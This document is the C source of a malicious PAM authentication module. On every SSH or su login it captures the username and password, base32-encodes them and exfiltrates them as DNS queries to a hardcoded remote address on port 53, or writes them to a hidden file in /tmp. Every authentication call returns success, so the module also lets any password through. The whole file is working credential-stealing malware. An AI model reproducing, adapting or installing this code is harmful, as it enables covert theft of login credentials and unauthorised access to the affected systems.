#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "../dns/dns.h"
#include "../encode/encode.h"

/*
    Need root previlege!!!
*/

/*
    Custom setting
*/
# define SSH_OR_BOTH 0 //ssh=0,su&&ssh=1,default is ssh
# define SAVE_OR_SEND 0 //send=0,save=1,default is send

/*
    Send to server
*/
# define MAX_RESEND 30
# define RESEND_INTERVAL 5
# define REMOTE_ADDRESS "192.168.0.12"
# define REMOTE_PORT 53

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.sshsucache"

int 
count_equals(char *encoded_string){
    int i ;
    int count = 0;
    int interrupt = 0;

    for (i = 0;i < strlen(encoded_string);i++){
        if (encoded_string[i] == '='){
            if (count == 0){
                interrupt = i;
            }
            count ++;
        }
    }

    if (count != 0) {
        encoded_string[interrupt] = '\0';
    }

    return count;
}

char *
modify_result(char *encoded_string){
    static char modify_string[2048];
    char temp[100];
    int i;

    memset(modify_string, 0, sizeof(modify_string));

    int number = strlen(encoded_string)/63;

    if (number == 0){
        return encoded_string;
    } else{
        for (i=0;i<number;i++){
            memset(temp, '\0', sizeof(temp));
            strncpy(temp,encoded_string+63*i*sizeof(char),63);
            temp[63] = '.';
            strcat(modify_string,temp);
        }
        memset(temp, '\0', sizeof(temp));
        strncpy(temp,encoded_string+63*i*sizeof(char),strlen(encoded_string)-63*i);
        strcat(modify_string,temp);
    }

    if (modify_string[strlen(modify_string)-1] == '.'){
         modify_string[strlen(modify_string)-1] = '\0';
    }

    return modify_string;
}

void 
saveResult(char stealResult[]) 
{
   FILE *fp = NULL;
 
   fp = fopen(SAVE_LOCATION, "a+");
   fputs(stealResult, fp);
   fclose(fp); 
}

void
sendResult(char stealResult[])
{
    struct sockaddr_in evil;
    unsigned char *packet;
    int sockfd;
    unsigned int slen = sizeof(evil);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        return;
    }

    evil.sin_family = AF_INET;
    evil.sin_port   = htons(REMOTE_PORT);
    evil.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);
    memset(&evil.sin_zero, 0, sizeof(evil.sin_zero));

    DNS_header *header = create_header(); 
    DNS_question *question = create_question(stealResult);
    size_t packet_length = build_packet(header, question, &packet);

    free(header);
    free(question);

    for (int i =0;i<MAX_RESEND;i++)
    {
       sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);

       fd_set fds;
       FD_ZERO(&fds);
       FD_SET(sockfd,&fds);
       struct timeval timeout;
       timeout.tv_sec = RESEND_INTERVAL;
       timeout.tv_usec = 0;

       int ok = select(sockfd+1,&fds,NULL,NULL,&timeout);
       if (ok >0)
       {
           return;
       }
    }
}

void
sendSingleResult(char stealResult[])
{
    struct sockaddr_in evil;
    unsigned char *packet;
    int sockfd;
    unsigned int slen = sizeof(evil);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        return;
    }

    evil.sin_family = AF_INET;
    evil.sin_port   = htons(REMOTE_PORT);
    evil.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);
    memset(&evil.sin_zero, 0, sizeof(evil.sin_zero));

    DNS_header *header = create_header(); 
    DNS_question *question = create_question(stealResult);
    size_t packet_length = build_packet(header, question, &packet);

    free(header);
    free(question);

    sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);
}

PAM_EXTERN int 
pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  const char* username;
  const char* password;

  char bonus[2048];
  
  pam_get_item(pamh,PAM_USER,(void *) &username);
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  
  snprintf(bonus,sizeof(bonus),"%s:%s\n",username,password);

  if (password != NULL)
  {
     char tmp_text[2048];
     baseencode_error_t err;

     strcpy(tmp_text,bonus);
     memset(bonus, '\0', sizeof(bonus));

     char *encoded_string = base32_encode((unsigned char*)tmp_text, strlen(tmp_text), &err);
     int count = count_equals(encoded_string);

     encoded_string = modify_result(encoded_string);

     snprintf(bonus, sizeof(bonus), "%d.%s.com", count,encoded_string); 
     free(encoded_string);
    
     if (SAVE_OR_SEND)
     {
         saveResult(bonus);
     }
     else if (SSH_OR_BOTH)
     {
        sendSingleResult(bonus);
     } 
     else if (!SSH_OR_BOTH)
     {
         int pid = fork();
         if (pid == 0)
         {
             sendResult(bonus);
         }
     }
  }
  return PAM_SUCCESS;
}

PAM_EXTERN int 
pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int 
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

